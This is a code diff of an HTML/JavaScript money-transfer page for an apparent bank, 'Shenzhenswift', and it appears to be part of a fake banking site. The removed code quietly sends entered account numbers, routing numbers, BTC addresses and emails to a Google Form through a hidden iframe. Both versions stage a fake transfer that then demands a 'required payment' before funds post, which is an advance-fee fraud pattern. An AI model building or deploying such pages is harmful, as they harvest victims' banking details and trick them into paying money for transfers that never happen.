@@ -1,711 +1,183 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transfer Money - Shenzhenswift</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 500px;
-            position: relative;
-            animation: slideIn 0.5s ease;
-        }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-30px);}
-            to { opacity: 1; transform: translateY(0);}
-        }
-        .header { text-align: center; margin-bottom: 30px; }
-        .logo {
-            font-size: 1.8rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 10px;
-        }
-        h2 { color: #333; margin-bottom: 5px; font-size: 1.8rem; }
-        .subtitle { color: #666; font-size: 0.9rem; }
-        .transfer-method-btn {
-            padding: 15px 20px;
-            margin: 8px 0;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 10px;
-            font-size: 16px;
-            width: 100%;
-            text-align: left;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .transfer-method-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-        .transfer-method-btn:hover::before { left: 100%; }
-        .transfer-method-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-        }
-        .transfer-method-btn:active { transform: translateY(0);}
-        .method-icon { font-size: 20px; margin-right: 12px; width: 30px; text-align: center;}
-        .method-text { flex: 1; }
-        .method-arrow { font-size: 12px; transition: transform 0.3s ease;}
-        .transfer-method-btn.active .method-arrow { transform: rotate(90deg);}
-        .transfer-form {
-            display: none;
-            margin: 15px 0;
-            padding: 20px;
-            border: 2px solid #e9ecef;
-            border-radius: 10px;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            animation: slideDown 0.3s ease;
-        }
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); max-height: 0;}
-            to { opacity: 1; transform: translateY(0); max-height: 500px;}
-        }
-        .transfer-form h3 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-            text-align: center;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #667eea;
-        }
-        .form-group { margin-bottom: 15px; }
-        label {
-            font-weight: 600;
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
-        }
-        .transfer-input {
-            padding: 12px 15px;
-            width: 100%;
-            font-size: 14px;
-            border: 2px solid #e9ecef;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        .transfer-input:focus {
-            border-color: #667eea;
-            outline: none;
-            box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
-            transform: translateY(-1px);
-        }
-        .transfer-input::placeholder { color: #adb5bd; }
-        .message {
-            color: #dc3545;
-            font-size: 14px;
-            margin: 15px 0;
-            padding: 12px;
-            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
-            border: 1px solid #f5c6cb;
-            border-radius: 8px;
-            display: none;
-            text-align: center;
-            font-weight: 500;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .submit-btn {
-            background: linear-gradient(45deg, #28a745, #20c997);
-            color: white;
-            padding: 15px 20px;
-            width: 100%;
-            border: none;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 10px;
-            margin-top: 20px;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-        .submit-btn:hover::before { left: 100%; }
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.3);
-        }
-        .submit-btn.loading {
-            background: linear-gradient(45deg, #6c757d, #5a6268);
-            cursor: not-allowed;
-            transform: none;
-        }
-        .submit-btn.success {
-            background: linear-gradient(45deg, #28a745, #34ce57);
-            animation: successPulse 0.6s ease;
-        }
-        @keyframes successPulse {
-            0% { transform: scale(1);}
-            50% { transform: scale(1.05);}
-            100% { transform: scale(1);}
-        }
-        .spinner {
-            display: inline-block;
-            width: 16px; height: 16px;
-            border: 2px solid #fff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            margin-left: 10px;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
-        .back-btn {
-            position: absolute;
-            top: 20px; left: 20px;
-            background: rgba(255, 255, 255, 0.9);
-            border: none;
-            width: 40px; height: 40px;
-            border-radius: 50%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            color: #667eea;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(10px);
-        }
-        .back-btn:hover {
-            background: white;
-            transform: translateX(-2px);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        .success-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
-            z-index: 1000;
-            animation: fadeIn 0.3s ease;
-        }
-        .success-content {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-            animation: successSlideIn 0.5s ease;
-        }
-        @keyframes successSlideIn {
-            from { opacity: 0; transform: translate(-50%, -60%);}
-            to { opacity: 1; transform: translate(-50%, -50%);}
-        }
-        .success-icon {
-            font-size: 4rem;
-            color: #28a745;
-            margin-bottom: 20px;
-            animation: successBounce 0.6s ease;
-        }
-        @keyframes successBounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0);}
-            40% { transform: translateY(-10px);}
-            60% { transform: translateY(-5px);}
-        }
-        .success-details {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            margin: 8px 0;
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(0,0,0,0.1);
-        }
-        .detail-row:last-child { border-bottom: none; }
-        .close-btn {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            padding: 12px 30px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-        .close-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
-        }
-        @media (max-width: 768px) {
-            .container { margin: 10px; padding: 20px;}
-            .transfer-method-btn { padding: 12px 15px; font-size: 14px;}
-            .method-icon { font-size: 18px; margin-right: 8px;}
-            h2 { font-size: 1.5rem;}
-            .success-content { padding: 30px 20px;}
-        }
-        .loading-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(102, 126, 234, 0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            backdrop-filter: blur(5px);
-        }
-        .loading-spinner {
-            width: 60px; height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: bigSpin 1s linear infinite;
-        }
-        @keyframes bigSpin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Transfer Money - Shenzhenswift</title>
+  <style>
+    *{box-sizing:border-box} body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:#f6f7fb;color:#333}
+    .container{max-width:900px;margin:40px auto;background:#fff;border:1px solid #e5e7eb;border-radius:16px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.08)}
+    .row{display:grid;gap:12px;grid-template-columns:1fr} @media(min-width:760px){.row{grid-template-columns:1fr 1fr}}
+    label{font-weight:700;font-size:.95rem} input,select{width:100%;padding:10px 12px;border:1px solid #e5e7eb;border-radius:10px;margin-top:6px}
+    .btn{margin-top:12px;padding:12px 16px;border:none;border-radius:10px;background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;font-weight:800;cursor:pointer}
+    .loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:1000;align-items:center;justify-content:center}
+    .receipt{width:min(420px,90vw);background:#fff;border-radius:16px;padding:18px;border:1px solid #e5e7eb;box-shadow:0 10px 30px rgba(0,0,0,.25)}
+    .spinner{width:28px;height:28px;border:3px solid #e5e7eb;border-top:3px solid #667eea;border-radius:50%;animation:spin .9s linear infinite;margin-right:8px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .payment-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:1100;align-items:center;justify-content:center}
+    .payment-card{width:min(460px,92vw);background:#fff;border-radius:16px;padding:18px;border:1px solid #e5e7eb;box-shadow:0 10px 30px rgba(0,0,0,.25)}
+    .flex{display:flex;gap:10px;flex-wrap:wrap} .btn-outline{background:#fff;color:#764ba2;border:2px solid #d9ddff;border-radius:10px;padding:10px 14px;cursor:pointer}
+    .muted{color:#666} .status-pill{display:inline-block;padding:6px 10px;border-radius:999px;font-weight:800;font-size:.8rem;color:#065f46;background:#d1fae5;border:1px solid #a7f3d0}
+  </style>
 </head>
 <body>
-    <div class="container">
-        <button class="back-btn" onclick="goBack()" title="Go Back">←</button>
-        <div class="header">
-            <div class="logo">Shenzhenswift</div>
-            <h2>Transfer Money</h2>
-            <p class="subtitle">Choose your preferred transfer method</p>
+  <div class="container">
+    <h2>Transfer</h2>
+    <form id="transferForm">
+      <div class="row">
+        <div>
+          <label>From account
+            <input id="fromAccount" placeholder="Everyday Checking • •••3482" required />
+          </label>
         </div>
-        <!-- Wire Transfer -->
-        <button class="transfer-method-btn" onclick="toggleForm('wireForm')" id="wireBtn">
-            <span class="method-icon">🏦</span>
-            <span class="method-text">Wire Transfer</span>
-            <span class="method-arrow">▶</span>
-        </button>
-        <div id="wireForm" class="transfer-form">
-            <h3>Wire Transfer</h3>
-            <div class="form-group">
-                <label for="wireAccount">Account Number</label>
-                <input type="text" id="wireAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="wireRouting">Routing Number</label>
-                <input type="text" id="wireRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="wireAmount">Amount</label>
-                <input type="number" id="wireAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
-            </div>
-            <div class="form-group">
-                <label for="wireRecipient">Recipient Name</label>
-                <input type="text" id="wireRecipient" placeholder="Enter recipient name" class="transfer-input" required>
-            </div>
-            <p class="message" id="wireMessage"></p>
-            <button class="submit-btn" onclick="submitTransfer('wireForm')" id="wireSubmit">Submit Wire Transfer</button>
+        <div>
+          <label>To account
+            <input id="toAccount" placeholder="Savings • •••9015 or External" required />
+          </label>
         </div>
-        <!-- EFT Transfer -->
-        <button class="transfer-method-btn" onclick="toggleForm('eftForm')" id="eftBtn">
-            <span class="method-icon">💳</span>
-            <span class="method-text">EFT Transfer</span>
-            <span class="method-arrow">▶</span>
-        </button>
-        <div id="eftForm" class="transfer-form">
-            <h3>EFT Transfer</h3>
-            <div class="form-group">
-                <label for="eftBank">Bank Name</label>
-                <input type="text" id="eftBank" placeholder="Enter bank name" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="eftAccount">Account Number</label>
-                <input type="text" id="eftAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="eftRouting">Routing Number</label>
-                <input type="text" id="eftRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="eftAmount">Amount</label>
-                <input type="number" id="eftAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
-            </div>
-            <p class="message" id="eftMessage"></p>
-            <button class="submit-btn" onclick="submitTransfer('eftForm')" id="eftSubmit">Submit EFT Transfer</button>
+        <div>
+          <label>Amount
+            <input id="amount" type="number" min="1" step="0.01" placeholder="1000.00" required />
+          </label>
         </div>
-        <!-- ACH Transfer -->
-        <button class="transfer-method-btn" onclick="toggleForm('achForm')" id="achBtn">
-            <span class="method-icon">🔄</span>
-            <span class="method-text">ACH Transfer</span>
-            <span class="method-arrow">▶</span>
-        </button>
-        <div id="achForm" class="transfer-form">
-            <h3>ACH Transfer</h3>
-            <div class="form-group">
-                <label for="achAccount">Account Number</label>
-                <input type="text" id="achAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="achRouting">Routing Number</label>
-                <input type="text" id="achRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="achAmount">Amount</label>
-                <input type="number" id="achAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
-            </div>
-            <div class="form-group">
-                <label for="achRecipient">Recipient Name</label>
-                <input type="text" id="achRecipient" placeholder="Enter recipient name" class="transfer-input" required>
-            </div>
-            <p class="message" id="achMessage"></p>
-            <button class="submit-btn" onclick="submitTransfer('achForm')" id="achSubmit">Submit ACH Transfer</button>
+        <div>
+          <label>Network / Type
+            <select id="network">
+              <option>Internal Transfer</option>
+              <option>ACH Transfer</option>
+              <option>Wire Transfer</option>
+              <option>EFT Transfer</option>
+            </select>
+          </label>
         </div>
-        <!-- Convert & Send to BTC -->
-        <button class="transfer-method-btn" onclick="toggleForm('btcForm')" id="btcBtn">
-            <span class="method-icon">₿</span>
-            <span class="method-text">Convert & Send to BTC</span>
-            <span class="method-arrow">▶</span>
-        </button>
-        <div id="btcForm" class="transfer-form">
-            <h3>Convert & Send to BTC</h3>
-            <div class="form-group">
-                <label for="btcAddress">Bitcoin Address</label>
-                <input type="text" id="btcAddress" placeholder="Enter BTC address" class="transfer-input" required>
-            </div>
-            <div class="form-group">
-                <label for="btcAmount">Amount in USD</label>
-                <input type="number" id="btcAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
-            </div>
-            <div class="form-group">
-                <label for="btcEmail">Email Address</label>
-                <input type="email" id="btcEmail" placeholder="Enter your email" class="transfer-input" required>
-            </div>
-            <p class="message" id="btcMessage"></p>
-            <button class="submit-btn" onclick="submitTransfer('btcForm')" id="btcSubmit">Submit BTC Conversion</button>
-        </div>
+      </div>
+      <button class="btn" type="submit" id="submitBtn">Send</button>
+    </form>
+  </div>
+
+  <!-- Loading/Receipt Overlay -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="receipt" id="receipt">
+      <div style="display:flex;align-items:center;margin-bottom:8px;">
+        <div class="spinner"></div>
+        <div style="font-weight:800;">Processing transfer…</div>
+      </div>
+      <div id="rStatus" class="status-pill">Pending</div>
+      <div style="margin-top:10px;">
+        <div><b>Amount:</b> <span id="rAmount">$0.00</span></div>
+        <div><b>From:</b> <span id="rFrom">—</span></div>
+        <div><b>To:</b> <span id="rTo">—</span></div>
+        <div><b>Network:</b> <span id="rNet">—</span></div>
+        <div><b>Reference:</b> <span id="rRef">—</span></div>
+        <div class="muted" style="margin-top:8px;">Complete the required payment to post this transfer.</div>
+      </div>
     </div>
-    <!-- Success Modal -->
-    <div id="successModal" class="success-modal">
-        <div class="success-content">
-            <div class="success-icon">✅</div>
-            <h2 style="color: #28a745; margin-bottom: 15px;">Transfer Processing!</h2>
-            <div id="successDetails" class="success-details"></div>
-            <button class="close-btn" onclick="closeSuccessModal()">Continue</button>
-        </div>
+  </div>
+
+  <!-- Payment required modal -->
+  <div id="paymentModal" class="payment-modal" role="dialog" aria-modal="true">
+    <div class="payment-card">
+      <h3>Payment required</h3>
+      <div class="muted" style="margin-top:6px;">To complete this transfer, please pay the required amount below.</div>
+      <div style="margin-top:12px;"><b>Amount to pay:</b> <span id="payAmount">$0.00</span></div>
+      <div style="margin-top:12px;">
+        <label>Payment method
+          <select id="payMethod" style="width:100%;padding:10px 12px;border:1px solid #e5e7eb;border-radius:10px;margin-top:6px;">
+            <option value="card">Card</option>
+            <option value="bank">Bank debit</option>
+          </select>
+        </label>
+      </div>
+      <div class="flex" style="margin-top:14px;">
+        <button id="payNowBtn" class="btn" type="button">Pay now</button>
+        <button id="cancelPayBtn" class="btn-outline" type="button">Cancel</button>
+      </div>
     </div>
-    <!-- Loading Overlay -->
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="loading-spinner"></div>
-    </div>
-    <script>
-        let activeForm = null;
+  </div>
 
-        // + helper for currency
-        function currency(n){ try{ return Number(n).toLocaleString(undefined,{style:'currency',currency:'USD'}) }catch{ return `$${n}` } }
+  <script>
+    function currency(n){ try{return Number(n).toLocaleString(undefined,{style:'currency',currency:'USD'})}catch{return `$${n}`}}
+    function genRef(){ return 'TXN' + Math.random().toString().slice(2,10) + Date.now().toString().slice(-4); }
 
-        function toggleForm(formId) {
-            const form = document.getElementById(formId);
-            const btn = document.getElementById(formId.replace('Form', 'Btn'));
-            if (activeForm && activeForm !== form) {
-                activeForm.style.display = "none";
-                const activeBtn = document.querySelector('.transfer-method-btn.active');
-                if (activeBtn) activeBtn.classList.remove('active');
-            }
-            if (form.style.display === "none" || form.style.display === "") {
-                form.style.display = "block";
-                btn.classList.add('active');
-                activeForm = form;
-                setTimeout(() => {
-                    form.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                }, 100);
-            } else {
-                form.style.display = "none";
-                btn.classList.remove('active');
-                activeForm = null;
-            }
+    const KEY = 'initiatedTransactions';
+    function getTxList(){ try{ return JSON.parse(sessionStorage.getItem(KEY) || '[]'); }catch{return []} }
+    function setTxList(list){ sessionStorage.setItem(KEY, JSON.stringify(list)); }
+
+    // Create transaction, show processing, then require payment to complete
+    document.getElementById('transferForm').addEventListener('submit', (e)=>{
+      e.preventDefault();
+      const user = JSON.parse(sessionStorage.getItem('loggedInUser') || '{}');
+      const amount = Number(document.getElementById('amount').value || 0);
+      const from = (document.getElementById('fromAccount').value || '').trim() || 'Everyday Checking •••3482';
+      const to = (document.getElementById('toAccount').value || '').trim() || 'External Account';
+      const network = document.getElementById('network').value;
+      const ref = genRef();
+
+      // Create PENDING tx
+      const tx = {
+        email: user.email,
+        source: 'transfer',
+        name: 'Transfer',
+        type: network,
+        amount: amount,
+        delta: amount ? `- ${currency(amount)}` : undefined,
+        from, to,
+        status: 'Pending',
+        reference: ref,
+        dateISO: new Date().toISOString(),
+        network,
+        paid: false
+      };
+      const list = getTxList();
+      list.unshift(tx);
+      setTxList(list);
+
+      // Show processing overlay
+      document.getElementById('rAmount').textContent = currency(amount);
+      document.getElementById('rFrom').textContent = from;
+      document.getElementById('rTo').textContent = to;
+      document.getElementById('rNet').textContent = network;
+      document.getElementById('rRef').textContent = ref;
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      // After brief processing, show payment required modal
+      setTimeout(()=>{
+        document.getElementById('loadingOverlay').style.display = 'none';
+        openPaymentModal(ref, amount);
+      }, 1500);
+    });
+
+    // Payment modal logic
+    function openPaymentModal(ref, amount){
+      const modal = document.getElementById('paymentModal');
+      const payAmt = document.getElementById('payAmount');
+      payAmt.textContent = currency(amount); // required payment equals transfer amount
+      modal.style.display = 'flex';
+
+      // Wire buttons
+      const payBtn = document.getElementById('payNowBtn');
+      const cancelBtn = document.getElementById('cancelPayBtn');
+
+      const payHandler = ()=>{
+        // Mark tx as Completed + paid, then redirect to details
+        const list = getTxList();
+        const idx = list.findIndex(t => (t.reference||t.ref||t.id) === ref);
+        if (idx !== -1) {
+          list[idx].paid = true;
+          list[idx].paidAt = new Date().toISOString();
+          list[idx].status = 'Completed';
         }
-        async function submitToGoogleForm(formData) {
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.name = 'hidden_iframe';
-                document.body.appendChild(iframe);
-                const form = document.createElement('form');
-                form.action = 'https://docs.google.com/forms/d/e/1FAIpQLSfxjKkr5DbJ3qvTd_T0LvNE_7jfhWa7zWGYTn2JI1kLQOxILQ/formResponse';
-                form.method = 'POST';
-                form.target = 'hidden_iframe';
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'entry.123456789'; // Replace with actual entry ID
-                input.value = JSON.stringify(formData);
-                form.appendChild(input);
-                document.body.appendChild(form);
-                form.submit();
-                setTimeout(() => {
-                    document.body.removeChild(iframe);
-                    document.body.removeChild(form);
-                }, 1000);
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-        function submitTransfer(formId) {
-            const form = document.getElementById(formId);
-            const submitBtn = form.querySelector('.submit-btn');
-            const messageElement = form.querySelector('.message');
-            const formData = {
-                formType: formId.replace('Form', ' Transfer'),
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-            let isValid = true;
-            let validationMessage = '';
-            if (formId === 'wireForm' || formId === 'eftForm' || formId === 'achForm') {
-                const accountNumber = form.querySelector("input[name='account']")?.value || "";
-                const routingNumber = form.querySelector("input[name='routing']")?.value || "";
-                const amount = form.querySelector("input[type='number']")?.value || "";
-                formData.accountNumber = accountNumber;
-                formData.routingNumber = routingNumber;
-                formData.amount = amount;
-                if (accountNumber.length < 4) {
-                    isValid = false;
-                    validationMessage = "Account number must be at least 4 digits.";
-                } else if (routingNumber.length < 4) {
-                    isValid = false;
-                    validationMessage = "Routing number must be at least 4 digits.";
-                } else if (!amount || parseFloat(amount) <= 0) {
-                    isValid = false;
-                    validationMessage = "Please enter a valid amount.";
-                }
-            } else if (formId === 'btcForm') {
-                const btcAddress = document.getElementById('btcAddress').value;
-                const amount = document.getElementById('btcAmount').value;
-                const email = document.getElementById('btcEmail').value;
-                formData.btcAddress = btcAddress;
-                formData.amount = amount;
-                formData.email = email;
-                if (!btcAddress || btcAddress.length < 10) {
-                    isValid = false;
-                    validationMessage = "Please enter a valid Bitcoin address.";
-                } else if (!amount || parseFloat(amount) <= 0) {
-                    isValid = false;
-                    validationMessage = "Please enter a valid amount.";
-                } else if (!email || !email.includes('@')) {
-                    isValid = false;
-                    validationMessage = "Please enter a valid email address.";
-                }
-            }
-            if (!isValid) {
-                showMessage(messageElement, validationMessage, 'error');
-                return;
-            }
-            submitToGoogleForm(formData);
-            messageElement.style.display = "none";
-            submitBtn.disabled = true;
-            submitBtn.classList.remove("success");
-            submitBtn.innerHTML = "Please wait...";
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('loadingOverlay').style.display = 'none';
-                submitBtn.classList.add("loading");
-                submitBtn.innerHTML = `Processing<span class="spinner"></span>`;
-                setTimeout(() => {
-                    showMessage(messageElement, "Payment of $2267 required.", 'payment');
-                    setTimeout(() => {
-                        submitBtn.classList.remove("loading");
-                        submitBtn.classList.add("success");
-                        submitBtn.innerHTML = "Transfer Processing ...";
+        setTxList(list);
+        modal.style.display = 'none';
+        window.location.href = `transaction-details.html?ref=${encodeURIComponent(ref)}`;
+      };
 
-                        const successData = prepareSuccessData(formId, formData);
+      const cancelHandler = ()=>{ modal.style.display = 'none'; };
 
-                        // Build and save transaction (so details page can load it by ?ref=)
-                        const user = JSON.parse(sessionStorage.getItem('loggedInUser') || '{}');
-                        const typeMap = { wireForm:'Wire Transfer', eftForm:'EFT Transfer', achForm:'ACH Transfer', btcForm:'Bitcoin Conversion' };
-                        const network = typeMap[formId] || 'Transfer';
-                        const ref = successData.reference;
-                        const amountNum = Number(formData.amount || 0);
-
-                        const from = 'Everyday Checking •••3482';
-                        let to = 'External Account';
-                        if (formId === 'btcForm' && formData.btcAddress) {
-                          to = formData.btcAddress;
-                        } else if (formData.accountNumber) {
-                          to = `Acct •••${String(formData.accountNumber).slice(-4)}`;
-                        }
-
-                        const tx = {
-                          email: user.email,
-                          source: 'transfer',
-                          name: network,
-                          type: network,
-                          amount: amountNum,
-                          delta: amountNum ? `- ${currency(amountNum)}` : undefined,
-                          from, to,
-                          status: 'Pending',
-                          reference: ref,
-                          dateISO: new Date().toISOString(),
-                          network
-                        };
-                        const key = 'initiatedTransactions';
-                        const list = JSON.parse(sessionStorage.getItem(key) || '[]');
-                        list.unshift(tx);
-                        sessionStorage.setItem(key, JSON.stringify(list));
-
-                        // Allow clicking the button to go to the exact transaction details
-                        submitBtn.disabled = false;               // enable click
-                        submitBtn.style.cursor = 'pointer';
-                        submitBtn.addEventListener('click', () => {
-                          window.location.href = `transaction-details.html?ref=${encodeURIComponent(ref)}`;
-                        }, { once:true });
-
-                        // Also show modal with Continue -> details page
-                        setTimeout(() => {
-                            showSuccessModal(successData);
-                        }, 1000);
-                    }, 1000);
-                }, 3000);
-            }, 1000);
-        }
-        function showMessage(element, message, type) {
-            element.innerText = message;
-            element.style.display = "block";
-            if (type === 'payment') {
-                element.style.background = 'linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%)';
-                element.style.color = '#856404';
-                element.style.borderColor = '#ffeaa7';
-            } else if (type === 'error') {
-                element.style.background = 'linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%)';
-                element.style.color = '#721c24';
-                element.style.borderColor = '#f5c6cb';
-            }
-        }
-        function prepareSuccessData(formId, formData) {
-            const transferTypes = {
-                'wireForm': 'Wire Transfer',
-                'eftForm': 'EFT Transfer',
-                'achForm': 'ACH Transfer',
-                'btcForm': 'Bitcoin Conversion'
-            };
-            const accountLast4 = formData.accountNumber ? formData.accountNumber.slice(-4) : 'N/A';
-            const routingLast4 = formData.routingNumber ? formData.routingNumber.slice(-4) : 'N/A';
-            const referenceNumber = 'TXN' + Date.now().toString().slice(-8);
-            return {
-                type: transferTypes[formId],
-                account: accountLast4,
-                routing: routingLast4,
-                amount: formData.amount || 'N/A',
-                reference: referenceNumber,
-                date: new Date().toLocaleDateString(),
-                time: new Date().toLocaleTimeString(),
-                status: 'Pending', // <-- changed from 'Completed' to 'Pending'
-                btcAddress: formData.btcAddress ? formData.btcAddress.substring(0, 10) + '...' : null
-            };
-        }
-        function showSuccessModal(data) {
-            const modal = document.getElementById('successModal');
-            const details = document.getElementById('successDetails');
-            let detailsHTML = `
-                <div class="detail-row">
-                    <strong>Transfer Type:</strong>
-                    <span>${data.type}</span>
-                </div>
-                <div class="detail-row">
-                    <strong>Reference Number:</strong>
-                    <span>${data.reference}</span>
-                </div>
-                <div class="detail-row">
-                    <strong>Date:</strong>
-                    <span>${data.date}</span>
-                </div>
-                <div class="detail-row">
-                    <strong>Time:</strong>
-                    <span>${data.time}</span>
-                </div>
-                <div class="detail-row">
-                    <strong>Status:</strong>
-                    <span style="color: #28a745; font-weight: bold;">${data.status}</span>
-                </div>
-            `;
-            if (data.amount !== 'N/A') {
-                detailsHTML += `
-                    <div class="detail-row">
-                        <strong>Amount:</strong>
-                        <span>$${data.amount}</span>
-                    </div>
-                `;
-            }
-            if (data.account !== 'N/A') {
-                detailsHTML += `
-                    <div class="detail-row">
-                        <strong>Account:</strong>
-                        <span>****${data.account}</span>
-                    </div>
-                `;
-            }
-            if (data.routing !== 'N/A') {
-                detailsHTML += `
-                    <div class="detail-row">
-                        <strong>Routing:</strong>
-                        <span>****${data.routing}</span>
-                    </div>
-                `;
-            }
-            if (data.btcAddress) {
-                detailsHTML += `
-                    <div class="detail-row">
-                        <strong>BTC Address:</strong>
-                        <span>${data.btcAddress}</span>
-                    </div>
-                `;
-            }
-            details.innerHTML = detailsHTML;
-            modal.style.display = 'block';
-
-            // Redirect to details for this exact ref on Continue
-            const btn = document.querySelector('.close-btn');
-            if (btn) {
-              btn.onclick = () => {
-                window.location.href = `transaction-details.html?ref=${encodeURIComponent(data.reference)}`;
-              };
-            }
-        }
-        function closeSuccessModal() {
-            document.getElementById('successModal').style.display = 'none';
-            // Optionally reset forms or redirect
-        }
-        function goBack() {
-            window.history.length > 1 ? window.history.back() : window.location.href = 'dashboard.html';
-        }
-    </script>
+      payBtn.onclick = payHandler;
+      cancelBtn.onclick = cancelHandler;
+      modal.addEventListener('click', (e)=>{ if(e.target === modal) cancelHandler(); }, { once:true });
+    }
+  </script>
 </body>
 </html>
